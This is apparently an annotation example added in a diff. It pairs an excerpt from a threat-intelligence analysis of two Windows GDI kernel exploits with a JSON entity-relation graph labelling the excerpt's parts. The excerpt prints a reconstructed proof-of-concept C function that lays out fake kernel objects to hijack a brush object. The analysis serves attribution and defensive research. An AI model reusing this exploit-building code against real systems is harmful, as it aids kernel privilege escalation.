@@ -1,0 +1,85 @@
+
+
+
+Sentence : Same Memory Layout
+At the heart of the exploits lies a single function that populates a buffer with the various
+fake GDI objects, which is pointed to by our user-mode Rbrush object. Not only do both
+exploits use a single function for the construction of all of these fake objects, but the
+memory layout of the objects in the argument buffer is also identical .
+Figure 22: Construction of the fake GDI objects, as done in Jian.
+When we analyzed the code of the Equation Group exploit, we used it to recreate a source
+code Proof-Of-Concept (POC). The result is the following beautified and labeled code:
+void populate_buffer_and_brush(char * pBuffer, HBRUSH hbrush)
+{
+memset(pBuffer, 0, 0x200);
+memset(&pBuffer[0x200], 0, 0xA8);
+memset(&pBuffer[0x2A8], 0, 0x30);
+memset(&pBuffer[0x2D8], 0, 0x10);
+24/36
+// 0x00: PALETTE
+(DWORD )( pBuffer + 0x18) = 2; // 0x14 - 0x1C: flPal
+(size_t )(pBuffer + 0x80) = pBuffer + 0x2A8; // 0x80 - 0x88: apalColor
+// Brush (DRAWSTREAMINFO)
+size_t * pBrush = (size_t*)hbrush;
+pBrush[3] = pBuffer + 0x29C; // pptlDstOffset - Pointer to 0
+pBrush[4] = pBuffer + 0x208; // pxloSrcToBGRA
+pBrush[5] = pBuffer + 0x208; // pxloDstToBGRA
+pBrush[6] = pBuffer + 0x208; // pxloBGRAToDst <-- We use this one (offset 0x30)
+pBrush[7] = 60; // ulStreamLength - 60
+pBrush[8] = pBuffer + 0x260; // pvStream - Pointer to our built "Stream"
+// Second Struct
+(size_t )(pBuffer + 0x200) = hbrush;
+// 0x208: _XLATE
+(size_t )(pBuffer + 0x230) = pBuffer; // ppalSrc
+(size_t )(pBuffer + 0x238) = pBuffer; // ppalDst <-- We use this one (offset 0x30)
+(size_t )(pBuffer + 0x240) = pBuffer; // ppalDstDC
+// 0x260 - 0x2A8: Our "Stream"
+(DWORD )(pBuffer + 0x260) = 9; // DS_NINEGRIDID (ulCmdID)
+(DWORD )(pBuffer + 0x26C) = 1; // rclDst.right = 0x01
+(DWORD )(pBuffer + 0x270) = 1; // rclDst.bottom = 0x01
+(DWORD )(pBuffer + 0x27C) = 80; // rclSrc.right = 0x50
+(DWORD )(pBuffer + 0x280) = 80; // rclSrc.bottom = 0x50
+(DWORD )(pBuffer + 0x284) = 4; // ngi.flFlags := DSDNG_PERPIXELALPHA (4)
+// 0x2A8: Palette Color Table
+(DWORD )(pBuffer + 0x2CC) = 100;
+// Fourth Struct
+25/36
+(size_t )(pBuffer + 0x2D8) = AllocMemoryPage(0x10000);
+(size_t )(pBuffer + 0x2E0) = g_pRtlCopyUnicodeString;
+}
+Aside from the added struct at the end of the buffer, which uses
+RtlCopyUnicodeString, the memory layout of the objects inside the argument buffer
+was completely identical .
+As we also labeled the different objects, we can see that the important part is the
+references from one object to another, and not the location in which they are stored in the
+buffer itself. And yet, as if by magic, both exploits share this memory layout.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "populate_buffer_and_brush function", "type" : "EXEF"},
+        {"id": 2, "description": "pBuffer buffer", "type" : "TAMP"},
+        {"id": 3, "description": "hbrush object (Rbrush)", "type" : "TAMP"},
+        {"id": 4, "description": "PALETTE structure", "type" : "TAMP"},
+        {"id": 5, "description": "DRAWSTREAMINFO structure", "type" : "TAMP"},
+        {"id": 6, "description": "Second Struct (unnamed)", "type" : "TAMP"},
+        {"id": 7, "description": "_XLATE structure", "type" : "TAMP"},
+        {"id": 8, "description": "Stream structure", "type" : "TAMP"},
+        {"id": 9, "description": "Palette Color Table", "type" : "TAMP"},
+        {"id": 10, "description": "Fourth Struct (unnamed)", "type" : "TAMP"},
+        {"id": 11, "description": "AllocMemoryPage function", "type" : "EXEF"},
+        {"id": 12, "description": "g_pRtlCopyUnicodeString pointer", "type" : "EXEF"}
+    ],
+    "edges": [
+        {"source": 1, "target": 2, "rel_name" : "uses buffer"},
+        {"source": 1, "target": 3, "rel_name" : "modifies brush object"},
+        {"source": 4, "target": 2, "rel_name" : "part of buffer"},
+        {"source": 5, "target": 2, "rel_name" : "part of buffer"},
+        {"source": 6, "target": 2, "rel_name" : "part of buffer"},
+        {"source": 7, "target": 2, "rel_name" : "part of buffer"},
+        {"source": 8, "target": 2, "rel_name" : "part of buffer"},
+        {"source": 9, "target": 2, "rel_name" : "part of buffer"},
+        {"source": 10, "target": 2, "rel_name" : "part of buffer"},
+        {"source": 11, "target": 10, "rel_name" : "used in struct"},
+        {"source": 12, "target": 10, "rel_name" : "used in struct"}
+    ]
+}
